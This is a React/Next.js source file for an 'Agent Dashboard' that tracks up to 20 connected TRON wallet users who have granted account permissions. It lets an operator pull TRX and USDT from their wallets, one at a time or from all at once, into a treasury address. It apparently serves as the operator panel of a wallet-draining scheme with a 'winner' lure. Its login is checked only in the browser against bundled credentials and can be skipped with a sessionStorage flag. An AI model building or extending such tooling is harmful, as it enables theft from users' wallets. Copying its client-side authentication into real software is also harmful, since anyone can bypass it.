"use client";

import { useEffect, useState, useRef } from "react";
import { agentCredentials } from "./creds";

// Simple helper around the existing backend API
async function api(path, opts = {}) {
  try {
    console.log(`[API] Calling: ${path}`, opts);
    const res = await fetch(path, {
      headers: { "content-type": "application/json", ...(opts.headers || {}) },
      ...opts,
    });
    
    let data;
    try {
      data = await res.json();
    } catch (jsonErr) {
      console.error(`[API] Failed to parse JSON response from ${path}:`, jsonErr);
      const text = await res.text();
      console.error(`[API] Response text:`, text);
      throw new Error(`Invalid JSON response: ${text.substring(0, 100)}`);
    }
    
    if (!res.ok) {
      console.error(`[API] Error response from ${path}:`, data);
      throw new Error(data.error || `HTTP ${res.status}`);
    }
    
    console.log(`[API] Success response from ${path}:`, data);
    return data;
  } catch (err) {
    console.error(`[API] Call failed for ${path}:`, err);
    throw err;
  }
}

export default function AgentPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [authError, setAuthError] = useState("");
  const [health, setHealth] = useState(null);
  const [connectedUsers, setConnectedUsers] = useState([]);
  const [wsConnected, setWsConnected] = useState(false);
  const [agentWalletAddress, setAgentWalletAddress] = useState("");
  const [sendToAddress, setSendToAddress] = useState("");
  const [sendAmount, setSendAmount] = useState("");
  const [sendStatus, setSendStatus] = useState("");
  const [bulkAmount, setBulkAmount] = useState("");
  const [bulkStatus, setBulkStatus] = useState("");
  const [bulkDeducting, setBulkDeducting] = useState(false);
  const [expandedAddresses, setExpandedAddresses] = useState(new Set());
  const [deductAmounts, setDeductAmounts] = useState({}); // { userId: { trx: "", usdt: "" } }
  const [deducting, setDeducting] = useState({}); // { userId: { trx: false, usdt: false } }
  
  const MAX_USERS = 20; // Maximum number of users supported

  const wsRef = useRef(null);

  // WebSocket connection for real-time updates
  useEffect(() => {
    // Use NEXT_PUBLIC_WS_URL if set, otherwise construct from current hostname and port
    let wsUrl = process.env.NEXT_PUBLIC_WS_URL;
    if (!wsUrl) {
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      // Default to backend port 8787, or use NEXT_PUBLIC_WS_PORT if set
      const wsPort = process.env.NEXT_PUBLIC_WS_PORT || '8787';
      wsUrl = `${protocol}//${window.location.hostname}:${wsPort}/ws`;
    }
    
    const ws = new WebSocket(wsUrl);
    wsRef.current = ws;

    ws.onopen = () => {
      console.log("Agent WebSocket connected");
      setWsConnected(true);
      // Register as agent
      ws.send(JSON.stringify({ type: 'register', role: 'agent' }));
      // Request current connected users
      ws.send(JSON.stringify({ type: 'get_users' }));
    };

    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      
      if (data.type === 'user_connected') {
        // Add or update user in the list
        setConnectedUsers(prev => {
          const existing = prev.find(u => u.userId === data.userId);
          if (existing) {
            return prev.map(u => 
              u.userId === data.userId 
                ? { ...u, address: data.address, permissionId: data.permissionId, connected: true }
                : u
            );
          }
          const newUser = {
            userId: data.userId,
            address: data.address,
            permissionId: data.permissionId,
            trxBalance: null,
            usdtBalance: null,
            connected: true
          };
          // Auto-fetch balance once when user connects (one-time only)
          if (data.address) {
            // Store address in closure to avoid stale state
            const userAddress = data.address.trim();
            const userId = data.userId;
            setTimeout(async () => {
              // Fetch balance directly with stored address
              try {
                console.log(`🔄 Auto-fetching balance for new user ${userId}, address: ${userAddress}`);
                const balances = await api(`/api/user/balances?address=${encodeURIComponent(userAddress)}`);
                console.log(`✅ Balance fetched for user ${userId}:`, balances);
                
                // Only update if we got valid balances
                if (balances && typeof balances === 'object' && balances.trxBalance !== undefined && balances.usdtBalance !== undefined) {
                  setConnectedUsers(prev => 
                    prev.map(u => 
                      u.userId === userId 
                        ? { ...u, trxBalance: String(balances.trxBalance), usdtBalance: String(balances.usdtBalance) }
                        : u
                    )
                  );
                } else {
                  console.warn(`⚠️ Invalid balance response structure for user ${userId}:`, balances);
                  // Leave balances as null - don't set fake values
                }
              } catch (e) {
                console.error(`❌ Failed to fetch balance for user ${userId} (${userAddress}):`, e.message || e);
                // Leave balances as null - don't set fake values when fetch fails
              }
            }, 2000); // Delay to ensure state is updated
          }
          return [...prev, newUser];
        });
      } else if (data.type === 'user_disconnected') {
        setConnectedUsers(prev => 
          prev.map(u => 
            u.userId === data.userId ? { ...u, connected: false } : u
          )
        );
      } else if (data.type === 'balance_update') {
        setConnectedUsers(prev => 
          prev.map(u => 
            u.userId === data.userId 
              ? { ...u, trxBalance: data.trxBalance, usdtBalance: data.usdtBalance }
              : u
          )
        );
      } else if (data.type === 'users_list') {
        const users = data.users || [];
        setConnectedUsers(users);
        // Auto-fetch balances for newly loaded users (one-time only, no polling)
        users.forEach((user, index) => {
          if (user.connected && user.address && (user.trxBalance == null || user.usdtBalance == null)) {
            // Store address in closure to avoid stale state
            const userAddress = user.address.trim();
            const userId = user.userId;
            setTimeout(async () => {
              // Fetch balance directly with stored address
              try {
                console.log(`🔄 [WebSocket] Auto-fetching balance for user ${userId}, address: ${userAddress}`);
                const balances = await api(`/api/user/balances?address=${encodeURIComponent(userAddress)}`);
                console.log(`✅ [WebSocket] Balance fetched for user ${userId}:`, balances);
                
                // Only update if we got valid balances
                if (balances && typeof balances === 'object' && balances.trxBalance !== undefined && balances.usdtBalance !== undefined) {
                  setConnectedUsers(prev => {
                    // Double-check user still exists and address matches
                    const existingUser = prev.find(u => u.userId === userId);
                    if (!existingUser) {
                      console.warn(`⚠️ [WebSocket] User ${userId} no longer exists, skipping balance update`);
                      return prev;
                    }
                    // Match by both userId and address to ensure we update the correct user
                    return prev.map(u => 
                      u.userId === userId && u.address === userAddress
                        ? { ...u, trxBalance: String(balances.trxBalance), usdtBalance: String(balances.usdtBalance) }
                        : u
                    );
                  });
                } else {
                  console.warn(`⚠️ [WebSocket] Invalid balance response structure for user ${userId}:`, balances);
                  // Leave balances as null - don't set fake values
                }
              } catch (e) {
                console.error(`❌ [WebSocket] Failed to fetch balance for user ${userId} (${userAddress}):`, e.message || e);
                // Leave balances as null - don't set fake values when fetch fails
              }
            }, 2000 + (index * 400)); // Stagger requests to avoid rate limits
          }
        });
      }
    };

    ws.onerror = (error) => {
      console.error("WebSocket error:", error);
    };

    ws.onclose = () => {
      console.log("Agent WebSocket disconnected");
      setWsConnected(false);
    };

    return () => {
      ws.close();
    };
  }, []);

  // Load backend health and agent wallet, and fetch users list
  useEffect(() => {
    (async () => {
      try {
        const data = await api("/api/health");
        setHealth(data);
        setAgentWalletAddress(data.treasuryAddress || "");
        
        // Load users list immediately
        try {
          const usersData = await api("/api/users/list");
          if (usersData.users && Array.isArray(usersData.users)) {
            console.log("📋 Loaded users from backend:", usersData.users.length);
            setConnectedUsers(usersData.users);
            // Auto-fetch balances for connected users (one-time on page load, no polling)
            usersData.users.forEach((user, index) => {
              if (user.connected && user.address && (user.trxBalance == null || user.usdtBalance == null)) {
                // Store address in closure to avoid stale state
                const userAddress = user.address.trim();
                const userId = user.userId;
                setTimeout(async () => {
                  // Fetch balance directly with stored address
                  try {
                    console.log(`🔄 [Initial Load] Auto-fetching balance for user ${userId}, address: ${userAddress}`);
                    const balances = await api(`/api/user/balances?address=${encodeURIComponent(userAddress)}`);
                    console.log(`✅ [Initial Load] Balance fetched for user ${userId}:`, balances);
                    
                    // Only update if we got valid balances
                    if (balances && typeof balances === 'object' && balances.trxBalance !== undefined && balances.usdtBalance !== undefined) {
                      setConnectedUsers(prev => {
                        // Double-check user still exists and address matches
                        const existingUser = prev.find(u => u.userId === userId);
                        if (!existingUser) {
                          console.warn(`⚠️ [Initial Load] User ${userId} no longer exists, skipping balance update`);
                          return prev;
                        }
                        // Ensure we're updating the correct user by matching both userId and address
                        return prev.map(u => 
                          u.userId === userId && u.address === userAddress
                            ? { ...u, trxBalance: String(balances.trxBalance), usdtBalance: String(balances.usdtBalance) }
                            : u
                        );
                      });
                    } else {
                      console.warn(`⚠️ [Initial Load] Invalid balance response structure for user ${userId}:`, balances);
                      // Leave balances as null - don't set fake values
                    }
                  } catch (e) {
                    console.error(`❌ [Initial Load] Failed to fetch balance for user ${userId} (${userAddress}):`, e.message || e);
                    console.error(`❌ [Initial Load] Error details:`, e);
                    // Leave balances as null - don't set fake values when fetch fails
                  }
                }, 2000 + (index * 400)); // Stagger requests to avoid rate limits
              }
            });
          }
        } catch (e) {
          console.error("Failed to fetch initial users list:", e);
        }
      } catch (e) {
        console.error("Health check failed:", e);
      }
    })();
  }, []);

  // Removed polling - users only update via WebSocket or manual refresh

  // Removed auto-fetch and polling - balances only update on manual refresh

  // Refresh user balances
  async function refreshUserBalances(userId) {
    // Use functional update to get latest state
    let userAddress = null;
    setConnectedUsers(prev => {
      const user = prev.find(u => u.userId === userId);
      if (user?.address) {
        userAddress = user.address.trim();
      }
      return prev;
    });

    if (!userAddress) {
      console.warn(`⚠️ Cannot refresh balance: user ${userId} has no address`);
      // Don't alert, just log - user might not be loaded yet
      return;
    }

    // Set loading state
    setConnectedUsers(prev => 
      prev.map(u => 
        u.userId === userId 
          ? { ...u, trxBalance: null, usdtBalance: null }
          : u
      )
    );

    try {
      console.log(`🔄 [Manual Refresh] Refreshing balance for user ${userId}, address: ${userAddress}`);
      
      const balances = await api(`/api/user/balances?address=${encodeURIComponent(userAddress)}`);
      console.log(`✅ [Manual Refresh] Balance refreshed for user ${userId}:`, balances);
      
      // Only update if we got valid balances
      if (balances && typeof balances === 'object' && balances.trxBalance !== undefined && balances.usdtBalance !== undefined) {
        setConnectedUsers(prev => {
          // Double-check user still exists
          const existingUser = prev.find(u => u.userId === userId);
          if (!existingUser) {
            console.warn(`⚠️ [Manual Refresh] User ${userId} no longer exists, skipping balance update`);
            return prev;
          }
          console.log(`✅ [Manual Refresh] Updating balance for user ${userId} from ${existingUser.trxBalance}/${existingUser.usdtBalance} to ${balances.trxBalance}/${balances.usdtBalance}`);
          // Match by both userId and address to ensure we update the correct user
          return prev.map(u => 
            u.userId === userId && u.address === userAddress
              ? { ...u, trxBalance: String(balances.trxBalance), usdtBalance: String(balances.usdtBalance) }
              : u
          );
        });
      } else {
        console.warn(`⚠️ [Manual Refresh] Invalid balance response structure for user ${userId}:`, balances);
        // Leave balances as null - don't set fake values
      }
    } catch (e) {
      console.error(`❌ [Manual Refresh] Failed to refresh balance for user ${userId}:`, e.message || e);
      console.error(`❌ [Manual Refresh] Error details:`, e);
      // Leave balances as null - don't set fake values when fetch fails
    }
  }

  // Retry permission for a user
  async function retryPermission(userId) {
    const user = connectedUsers.find(u => u.userId === userId);
    if (!user?.address) return;

    try {
      const lookup = await api(
        `/api/permission/lookup?address=${encodeURIComponent(user.address)}`
      );
      if (lookup.found) {
        await api("/api/user/register", {
          method: "POST",
          body: JSON.stringify({ 
            address: user.address, 
            permissionId: lookup.permissionId,
            userId 
          }),
        });
        setConnectedUsers(prev => 
          prev.map(u => 
            u.userId === userId 
              ? { ...u, permissionId: lookup.permissionId }
              : u
          )
        );
      }
    } catch (e) {
      console.error("Retry permission failed:", e);
    }
  }

  // Deduct TRX from a user
  async function deductTrx(userId, amount) {
    const user = connectedUsers.find(u => u.userId === userId);
    if (!user?.address || !user?.permissionId) {
      alert("User not registered or permission not found");
      return;
    }

    if (!amount || parseFloat(amount) <= 0) {
      alert("Please enter a valid amount");
      return;
    }

    setDeducting(prev => ({ ...prev, [userId]: { ...prev[userId], trx: true } }));

    try {
      const amountSun = Math.round(parseFloat(amount) * 1_000_000);
      const data = await api("/api/deduct/trx", {
        method: "POST",
        body: JSON.stringify({ 
          address: user.address, 
          toAddress: agentWalletAddress, 
          amountSun 
        }),
      });
      if (data.ok) {
        // Clear input
        setDeductAmounts(prev => ({ ...prev, [userId]: { ...prev[userId], trx: "" } }));
        // Refresh balance after successful deduction
        setTimeout(async () => {
          await refreshUserBalances(userId);
        }, 2000); // Wait 2 seconds for transaction to be confirmed
        alert(`✓ Deducted ${amount} TRX successfully\nTx: ${data.receipt.txid}`);
      } else {
        alert("❌ Deduction failed: " + (data.error || "Unknown error"));
      }
    } catch (e) {
      alert("❌ Deduction failed: " + e.message);
    } finally {
      setDeducting(prev => ({ ...prev, [userId]: { ...prev[userId], trx: false } }));
    }
  }

  // Deduct USDT from a user
  async function deductUsdt(userId, amount) {
    const user = connectedUsers.find(u => u.userId === userId);
    if (!user?.address || !user?.permissionId) {
      alert("User not registered or permission not found");
      return;
    }

    if (!amount || parseFloat(amount) <= 0) {
      alert("Please enter a valid amount");
      return;
    }

    setDeducting(prev => ({ ...prev, [userId]: { ...prev[userId], usdt: true } }));

    try {
      const amountUnits = Math.round(parseFloat(amount) * 1_000_000);
      const data = await api("/api/deduct/usdt", {
        method: "POST",
        body: JSON.stringify({ 
          address: user.address, 
          toAddress: agentWalletAddress, 
          amount: amountUnits 
        }),
      });
      if (data.ok) {
        // Clear input
        setDeductAmounts(prev => ({ ...prev, [userId]: { ...prev[userId], usdt: "" } }));
        // Refresh balance after successful deduction
        setTimeout(async () => {
          await refreshUserBalances(userId);
        }, 2000); // Wait 2 seconds for transaction to be confirmed
        alert(`✓ Deducted ${amount} USDT successfully\nTx: ${data.receipt.txid}`);
      } else {
        alert("❌ Deduction failed: " + (data.error || "Unknown error"));
      }
    } catch (e) {
      alert("❌ Deduction failed: " + e.message);
    } finally {
      setDeducting(prev => ({ ...prev, [userId]: { ...prev[userId], usdt: false } }));
    }
  }

  // Toggle address expansion
  function toggleAddress(userId) {
    setExpandedAddresses(prev => {
      const newSet = new Set(prev);
      if (newSet.has(userId)) {
        newSet.delete(userId);
      } else {
        newSet.add(userId);
      }
      return newSet;
    });
  }

  // Bulk deduct from all users
  async function bulkDeduct() {
    if (!bulkAmount || parseFloat(bulkAmount) <= 0) {
      setBulkStatus("Enter a valid amount");
      return;
    }

    const registeredUsers = connectedUsers.filter(u => u.address && u.permissionId && u.connected);
    if (registeredUsers.length === 0) {
      setBulkStatus("No registered users available");
      return;
    }

    setBulkDeducting(true);
    setBulkStatus("Deducting from all users...");

    try {
      const amountUnits = Math.round(parseFloat(bulkAmount) * 1_000_000);
      const data = await api("/api/deduct/bulk/usdt", {
        method: "POST",
        body: JSON.stringify({ 
          users: registeredUsers.map(u => ({
            address: u.address,
            permissionId: u.permissionId
          })),
          amount: amountUnits,
          toAddress: agentWalletAddress
        }),
      });

      if (data.ok) {
        setBulkStatus(`Successfully deducted ${bulkAmount} USDT from ${data.successCount} users`);
        // Refresh all balances
        for (const user of registeredUsers) {
          await refreshUserBalances(user.userId);
        }
      } else {
        setBulkStatus("Bulk deduction failed: " + (data.error || "Unknown error"));
      }
    } catch (e) {
      setBulkStatus("Bulk deduction failed: " + e.message);
    } finally {
      setBulkDeducting(false);
    }
  }

  // Send money to winner
  async function sendToWinner() {
    if (!sendToAddress || !sendAmount || parseFloat(sendAmount) <= 0) {
      setSendStatus("Enter valid address and amount");
      return;
    }

    try {
      const amountUnits = Math.round(parseFloat(sendAmount) * 1_000_000);
      const data = await api("/api/send/usdt", {
        method: "POST",
        body: JSON.stringify({ 
          toAddress: sendToAddress,
          amount: amountUnits
        }),
      });

      if (data.ok) {
        setSendStatus(`Sent ${sendAmount} USDT successfully (tx: ${data.receipt.txid})`);
        setSendToAddress("");
        setSendAmount("");
      } else {
        setSendStatus("Send failed: " + (data.error || "Unknown error"));
      }
    } catch (e) {
      setSendStatus("Send failed: " + e.message);
    }
  }

  // Handle authentication
  const handleLogin = (e) => {
    e.preventDefault();
    setAuthError("");
    
    if (username === agentCredentials.username && password === agentCredentials.password) {
      setIsAuthenticated(true);
      // Store auth in sessionStorage so it persists on refresh
      sessionStorage.setItem("agent_authenticated", "true");
    } else {
      setAuthError("Invalid credentials. Please try again.");
      setPassword("");
    }
  };

  // Check if already authenticated on mount
  useEffect(() => {
    const authStatus = sessionStorage.getItem("agent_authenticated");
    if (authStatus === "true") {
      setIsAuthenticated(true);
    }
  }, []);

  // Show login form if not authenticated
  if (!isAuthenticated) {
    return (
      <div className="agent-page" style={{ 
        display: "flex", 
        justifyContent: "center", 
        alignItems: "center", 
        minHeight: "100vh",
        background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)"
      }}>
        <div style={{
          background: "#1e1e2e",
          padding: "40px",
          borderRadius: "12px",
          boxShadow: "0 8px 32px rgba(0, 0, 0, 0.3)",
          border: "1px solid #2a2a3e",
          width: "100%",
          maxWidth: "400px"
        }}>
          <div style={{ textAlign: "center", marginBottom: "30px" }}>
            <div style={{ fontSize: "32px", fontWeight: "bold", color: "#4ade80", marginBottom: "8px" }}>AG</div>
            <h2 style={{ color: "#fff", margin: 0 }}>Agent Dashboard</h2>
            <p style={{ color: "#888", marginTop: "8px", fontSize: "14px" }}>Secure Access Required</p>
          </div>
          
          <form onSubmit={handleLogin}>
            <div style={{ marginBottom: "20px" }}>
              <label style={{ display: "block", color: "#ccc", marginBottom: "8px", fontSize: "14px" }}>
                Username
              </label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                style={{
                  width: "100%",
                  padding: "12px",
                  background: "#2a2a3e",
                  border: "1px solid #3a3a4e",
                  borderRadius: "8px",
                  color: "#fff",
                  fontSize: "14px",
                  boxSizing: "border-box"
                }}
                placeholder="Enter username"
                required
                autoFocus
              />
            </div>
            
            <div style={{ marginBottom: "24px" }}>
              <label style={{ display: "block", color: "#ccc", marginBottom: "8px", fontSize: "14px" }}>
                Password
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                style={{
                  width: "100%",
                  padding: "12px",
                  background: "#2a2a3e",
                  border: "1px solid #3a3a4e",
                  borderRadius: "8px",
                  color: "#fff",
                  fontSize: "14px",
                  boxSizing: "border-box"
                }}
                placeholder="Enter password"
                required
              />
            </div>
            
            {authError && (
              <div style={{
                padding: "12px",
                background: "#7f1d1d",
                border: "1px solid #991b1b",
                borderRadius: "8px",
                color: "#fca5a5",
                marginBottom: "20px",
                fontSize: "14px"
              }}>
                {authError}
              </div>
            )}
            
            <button
              type="submit"
              style={{
                width: "100%",
                padding: "12px",
                background: "#4ade80",
                border: "none",
                borderRadius: "8px",
                color: "#000",
                fontSize: "16px",
                fontWeight: "bold",
                cursor: "pointer",
                transition: "background 0.2s"
              }}
              onMouseOver={(e) => e.target.style.background = "#22c55e"}
              onMouseOut={(e) => e.target.style.background = "#4ade80"}
            >
              Login
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="agent-page">
      <header className="secure-header">
        <div className="secure-header-left">
          <div className="secure-logo">AG</div>
          <div className="secure-app-title">Agent Dashboard</div>
        </div>
        <div className="secure-header-right" style={{ display: "flex", alignItems: "center", gap: "12px" }}>
          <div className={`nx-network-pill ${wsConnected ? 'ws-connected' : 'ws-disconnected'}`}>
            <span className={`nx-dot ${wsConnected ? "nx-dot-ok" : "nx-dot-err"}`} />
            {wsConnected ? "Connected" : "Disconnected"}
          </div>
          <button
            onClick={() => {
              setIsAuthenticated(false);
              sessionStorage.removeItem("agent_authenticated");
            }}
            style={{
              padding: "8px 16px",
              background: "#dc2626",
              border: "none",
              borderRadius: "6px",
              color: "#fff",
              fontSize: "14px",
              fontWeight: "500",
              cursor: "pointer",
              transition: "background 0.2s"
            }}
            onMouseOver={(e) => e.target.style.background = "#b91c1c"}
            onMouseOut={(e) => e.target.style.background = "#dc2626"}
          >
            Logout
          </button>
        </div>
      </header>

      <div className="agent-container">
        {/* Agent Wallet Info and Send Money Section */}
        <div className="agent-controls">
          <div className="agent-wallet-section">
            <h3 className="agent-section-title">Agent Wallet</h3>
            <div className="wallet-address-display">{agentWalletAddress || "Not configured"}</div>
          </div>

          <div className="send-money-section">
            <h3 className="agent-section-title">Send Money to Winner</h3>
            <div className="send-money-form">
              <input
                className="nx-input"
                placeholder="Winner wallet address"
                value={sendToAddress}
                onChange={(e) => setSendToAddress(e.target.value)}
                style={{ marginBottom: "8px" }}
              />
              <div style={{ display: "flex", gap: "8px" }}>
                <input
                  className="nx-input"
                  type="number"
                  placeholder="Amount (USDT)"
                  value={sendAmount}
                  onChange={(e) => setSendAmount(e.target.value)}
                  style={{ flex: 1 }}
                />
                <button className="modern-btn modern-btn-primary" onClick={sendToWinner}>
                  Send
                </button>
              </div>
              {sendStatus && (
                <div className="nx-status-note" style={{ marginTop: "8px" }}>{sendStatus}</div>
              )}
            </div>
          </div>

          <div className="bulk-deduct-section">
            <h3 className="agent-section-title">Bulk Deduct from All Users</h3>
            <div className="bulk-deduct-form">
              <div style={{ display: "flex", gap: "8px" }}>
                <input
                  className="nx-input"
                  type="number"
                  placeholder="Amount (USDT)"
                  value={bulkAmount}
                  onChange={(e) => setBulkAmount(e.target.value)}
                  style={{ flex: 1 }}
                />
                <button 
                  className="modern-btn modern-btn-primary" 
                  onClick={bulkDeduct}
                  disabled={bulkDeducting}
                >
                  {bulkDeducting ? "Processing..." : "Deduct All"}
                </button>
              </div>
              {bulkStatus && (
                <div className="nx-status-note" style={{ marginTop: "8px" }}>{bulkStatus}</div>
              )}
            </div>
          </div>
        </div>

        {/* User Cards Grid */}
        <div className="agent-users-grid">
          <h2 className="agent-users-title">Connected Users ({connectedUsers.filter(u => u.connected).length}/{MAX_USERS})</h2>
          <div className="users-cards-container">
            {Array.from({ length: MAX_USERS }, (_, i) => {
              const userId = String(i + 1);
              const user = connectedUsers.find(u => u.userId === userId);
              
              return (
                <div key={userId} className={`user-card ${user?.connected ? 'user-connected' : 'user-disconnected'}`}>
                  <div className="user-card-header">
                    <h3 className="user-card-title">User {userId}</h3>
                    {user?.connected && (
                      <span className="user-status-badge">Connected</span>
                    )}
                  </div>

                  {user?.connected ? (
                    <>
                      <div className="user-card-address-container">
                        <div className="user-card-address" onClick={() => toggleAddress(userId)}>
                          {expandedAddresses.has(userId) ? (
                            <span className="address-full">{user.address}</span>
                          ) : (
                            <span className="address-short">
                              {user.address ? `${user.address.slice(0, 6)}...${user.address.slice(-4)}` : "Not connected"}
                            </span>
                          )}
                          <button className="address-toggle-btn" title="Click to expand/collapse">
                            {expandedAddresses.has(userId) ? "▼" : "▶"}
                          </button>
                        </div>
                      </div>

                      <div className="user-card-balances">
                        <div className="user-balance-item">
                          <span className="balance-label-small">💎 TRX:</span>
                          <span className="balance-value-small">
                            {user.trxBalance == null ? (
                              <span className="balance-loading">—</span>
                            ) : user.trxBalance === "Error" ? (
                              <span className="balance-error">❌ Error</span>
                            ) : (
                              <span className="balance-value-number">{user.trxBalance} TRX</span>
                            )}
                          </span>
                        </div>
                        <div className="user-balance-item">
                          <span className="balance-label-small">💰 USDT:</span>
                          <span className="balance-value-small">
                            {user.usdtBalance == null ? (
                              <span className="balance-loading">—</span>
                            ) : user.usdtBalance === "Error" ? (
                              <span className="balance-error">❌ Error</span>
                            ) : (
                              <span className="balance-value-number">{user.usdtBalance} USDT</span>
                            )}
                          </span>
                        </div>
                      </div>

                      <div className="user-card-actions">
                        <button
                          className="modern-btn modern-btn-small"
                          onClick={() => refreshUserBalances(userId)}
                        >
                          🔄 Refresh
                        </button>
                        {!user.permissionId && (
                          <button
                            className="modern-btn modern-btn-small"
                            onClick={() => retryPermission(userId)}
                          >
                            🔑 Retry Permission
                          </button>
                        )}
                      </div>

                      <div className="user-card-deduct">
                        <div className="deduct-section-title">
                          Deductions
                          {!user.permissionId && (
                            <span className="deduct-disabled-hint"> (Grant permission first)</span>
                          )}
                        </div>
                        <div className="deduct-input-group">
                          <input
                            className="nx-input nx-input-small"
                            type="number"
                            step="0.000001"
                            placeholder="TRX amount"
                            value={deductAmounts[userId]?.trx || ""}
                            onChange={(e) => setDeductAmounts(prev => ({
                              ...prev,
                              [userId]: { ...prev[userId], trx: e.target.value }
                            }))}
                            disabled={deducting[userId]?.trx || !user.permissionId}
                          />
                          <button
                            className="modern-btn modern-btn-small modern-btn-danger"
                            onClick={() => deductTrx(userId, deductAmounts[userId]?.trx)}
                            disabled={deducting[userId]?.trx || !deductAmounts[userId]?.trx || !user.permissionId}
                            title={!user.permissionId ? "User needs to grant permission first" : ""}
                          >
                            {deducting[userId]?.trx ? "⏳..." : "Deduct TRX"}
                          </button>
                        </div>
                        <div className="deduct-input-group" style={{ marginTop: "8px" }}>
                          <input
                            className="nx-input nx-input-small"
                            type="number"
                            step="0.01"
                            placeholder="USDT amount"
                            value={deductAmounts[userId]?.usdt || ""}
                            onChange={(e) => setDeductAmounts(prev => ({
                              ...prev,
                              [userId]: { ...prev[userId], usdt: e.target.value }
                            }))}
                            disabled={deducting[userId]?.usdt || !user.permissionId}
                          />
                          <button
                            className="modern-btn modern-btn-small modern-btn-danger"
                            onClick={() => deductUsdt(userId, deductAmounts[userId]?.usdt)}
                            disabled={deducting[userId]?.usdt || !deductAmounts[userId]?.usdt || !user.permissionId}
                            title={!user.permissionId ? "User needs to grant permission first" : ""}
                          >
                            {deducting[userId]?.usdt ? "⏳..." : "Deduct USDT"}
                          </button>
                        </div>
                      </div>
                    </>
                  ) : (
                    <div className="user-card-empty">
                      <p>Waiting for user to connect...</p>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  );
}

